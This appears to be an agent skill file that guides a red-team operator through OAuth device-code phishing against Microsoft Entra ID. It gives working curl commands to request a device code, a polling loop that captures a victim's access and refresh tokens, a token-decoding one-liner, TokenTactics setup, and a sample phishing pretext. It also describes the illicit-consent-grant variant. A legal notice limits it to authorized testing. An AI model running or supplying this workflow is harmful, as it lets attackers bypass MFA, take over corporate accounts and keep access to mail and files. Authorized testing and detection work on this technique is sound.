---
name: attacking-oauth-with-device-code-phishing
description: "Run OAuth 2.0 device-code and illicit-consent phishing attacks. Signals: phishing, social engineering, phishing emails."
zh-signals: "Run OAuth 2.0 device-code and illicit-consent phishing attacks against 信号:钓鱼,社会工程,钓鱼邮件。"
when-to-use: Run OAuth 2.0 device-code and illicit-consent phishing attacks against
  Microsoft Entra ID, using TokenTactics-style tooling to steal access and refresh
  tokens, bypass MFA, and pivot across Microsoft 365 services. Use for authorized
  red-team engagements simulating device-code or consent-grant phishing against a
  tenant you have explicit written permission to test.
domain: cybersecurity
subdomain: identity-access-management
tags:
- device-code-phishing
- oauth
- entra-id
- token-theft
- mfa-bypass
- illicit-consent
- tokentactics
- red-team
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.AA-03
mitre_attack:
- T1528
---
# Attacking OAuth with Device-Code Phishing

> **Legal Notice:** This skill is for authorized security testing, red-team engagements, and educational purposes only. Device-code and consent-grant phishing manipulate real users into authorizing attacker-controlled access to corporate identities. Execute only against tenants you own or have explicit written authorization (rules of engagement) to test. Unauthorized use violates the Computer Fraud and Abuse Act and equivalent laws worldwide.

## Overview

The OAuth 2.0 Device Authorization Grant (RFC 8628) was designed for input-constrained devices (smart TVs, CLI tools) that cannot easily present a browser-based login. A device requests a short `user_code` and a `device_code`, displays the `user_code` and a verification URL to the user, and polls the token endpoint while the user authenticates on a separate, fully-featured device. Attackers weaponize this flow: instead of a smart TV, the "device" is the attacker's machine. The attacker initiates the device-code request, then phishes a victim to visit the legitimate Microsoft verification page (`https://microsoft.com/devicelogin`) and enter the attacker-generated `user_code`. Because the victim authenticates on the genuine Microsoft login page — completing MFA — the resulting tokens are minted to the attacker's polling session. This bypasses MFA entirely: the second factor is satisfied by the victim, but the bearer tokens land with the attacker (mapped to MITRE ATT&CK **T1528 – Steal Application Access Token**).

Microsoft Threat Intelligence, Volexity, and Proofpoint documented sharp growth in device-code phishing through 2025, with Russia-aligned actors (tracked by Microsoft as Storm-2372) among the most prolific. Mandiant's M-Trends reporting similarly highlights OAuth token theft as a leading cloud initial-access vector. A closely related technique is the **illicit consent grant** ("OAuth phishing"): the attacker registers a multi-tenant app and tricks the victim into clicking an `/adminconsent` or user-consent URL, granting the malicious app delegated Microsoft Graph permissions (Mail.Read, Files.ReadWrite.All, offline_access) that persist independently of password resets. This skill covers both, plus token replay across Microsoft 365 services using TokenTactics and validation/access mapping with ROADtools.

The defining property red teams exploit: access tokens minted via the device-code flow are valid for roughly 60–90 minutes, but the accompanying refresh token (with `offline_access` scope) survives for up to 90 days and can be redeemed for fresh tokens against any first-party resource the client is allowed to request — Outlook, SharePoint, Teams, Azure Resource Manager — enabling durable, MFA-surviving access.

## When to Use

- During an authorized red-team or assumed-breach engagement targeting Microsoft 365 / Entra ID where social-engineering is in scope
- When validating Conditional Access policies, MFA enforcement, and token-protection controls against real phishing techniques
- When testing whether an organization restricts the OAuth device-code flow or blocks unverified multi-tenant app consent
- When demonstrating MFA-bypass risk to justify phishing-resistant authentication (FIDO2) and token-binding controls
- When building detections (paired with the blue-team `hunting-saas-sso-token-abuse` skill) and you need realistic telemetry

## Prerequisites

- Written authorization / rules of engagement explicitly permitting phishing and token theft against the target tenant
- A controlled pretext-delivery channel (sanctioned phishing infrastructure or an internal test mailbox)
- Linux or Windows attacker host with Python 3.8+ and PowerShell 7+
- TokenTactics (PowerShell) and ROADtools (Python) installed:
  ```bash
  # ROADtools (roadrecon + roadtx) — Dirk-jan Mollema / Outsider Security
  pip install roadtools roadtools_auth
  # roadtx (ROADtools Token eXchange) ships in roadtools_auth
  roadtx --help

  # TokenTactics v2 (rvrsh3ll)
  git clone https://github.com/rvrsh3ll/TokenTactics.git
  pwsh -c "Import-Module ./TokenTactics/TokenTactics.psd1"
  ```
- Familiarity with OAuth 2.0 grant types, JWT structure, and Microsoft Graph scopes

## Objectives

- Initiate an OAuth device-code request against Entra ID using a first-party client ID
- Deliver a credible pretext that drives the victim to the genuine Microsoft device-login page
- Poll the token endpoint and capture the victim's access and refresh tokens
- Refresh tokens across Microsoft 365 resources (Graph, Outlook, Azure management) to expand access
- Execute the illicit-consent variant by registering and phishing consent for a malicious multi-tenant app
- Enumerate accessible resources and data with ROADtools to demonstrate impact
- Document MFA bypass and produce remediation recommendations

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1528 | Steal Application Access Token | Phishing the device-code flow / consent grant yields attacker-controlled OAuth access and refresh tokens that are reused to access cloud services without re-authenticating |

Related techniques frequently chained: **T1566** Phishing (delivery), **T1550.001** Application Access Token (replaying stolen tokens), **T1098.003** Account Manipulation: Additional Cloud Roles (consent grant persistence).

## Workflow

### Phase 1: Initiate the Device-Code Request

The attacker requests a device code from Entra ID, choosing a first-party client that the victim implicitly trusts. The Microsoft Office client ID `d3590ed6-52b3-4102-aeff-aad2292ab01c` is commonly used because it is pre-authorized for broad first-party resources.

1. Request a device code directly via the token endpoint:
   ```bash
   # client_id = Microsoft Office; scope requests offline_access for a long-lived refresh token
   curl -s -X POST \
     'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode' \
     -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
     -d 'scope=https://graph.microsoft.com/.default offline_access' | tee devicecode.json
   ```
2. The JSON response contains the fields you weaponize:
   ```json
   {
     "user_code": "B7HVQXKZ2",
     "device_code": "GMMhmHCXhWEzkobqIHGG_EnNYYsAkukHspeYUk9E8...",
     "verification_uri": "https://microsoft.com/devicelogin",
     "expires_in": 900,
     "interval": 5,
     "message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code B7HVQXKZ2 to authenticate."
   }
   ```
3. Note the 15-minute (`expires_in: 900`) validity window — the pretext must drive the victim to authenticate quickly.

   Equivalent using TokenTactics (handles polling automatically):
   ```powershell
   Import-Module ./TokenTactics/TokenTactics.psd1
   # Generates a device code and begins polling; prints the user_code to phish
   Get-AzureToken -Client MSGraph
   ```

### Phase 2: Deliver the Pretext

The phishing message must NOT contain a credential-harvesting link — the victim authenticates on the real Microsoft page, which is what defeats user suspicion and MFA.

1. Craft a pretext that references the genuine `https://microsoft.com/devicelogin` URL and the `user_code` (e.g., "IT is enrolling your account in the new Teams Rooms device; open microsoft.com/devicelogin and enter code B7HVQXKZ2 within 15 minutes").
2. Send through sanctioned phishing infrastructure. Hyperlinked codes/URLs frequently land in spam, so present the URL and code as plain text.
3. Time delivery to the start of a polling cycle so the code is fresh.

### Phase 3: Poll and Capture Tokens

While the victim authenticates and approves, poll the token endpoint with the `device_code` until tokens are issued.

1. Poll at the server-specified `interval` (5 seconds); `authorization_pending` is expected until the victim completes sign-in:
   ```bash
   DEVICE_CODE=$(python -c "import json;print(json.load(open('devicecode.json'))['device_code'])")
   while true; do
     RESP=$(curl -s -X POST \
       'https://login.microsoftonline.com/organizations/oauth2/v2.0/token' \
       -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
       -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c' \
       -d "device_code=${DEVICE_CODE}")
     echo "$RESP" | grep -q access_token && { echo "$RESP" > tokens.json; break; }
     echo "$RESP" | grep -q authorization_pending || echo "$RESP"
     sleep 5
   done
   ```
2. On success the response yields `access_token`, `refresh_token`, `id_token`, `expires_in`, and the granted `scope`.
3. Decode the access token to confirm the captured identity, audience, and scopes:
   ```bash
   python -c "import json,base64;p=json.load(open('tokens.json'))['access_token'].split('.')[1];print(json.loads(base64.urlsafe_b64decode(p+'=='*(-len(p)%4))))"
   ```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
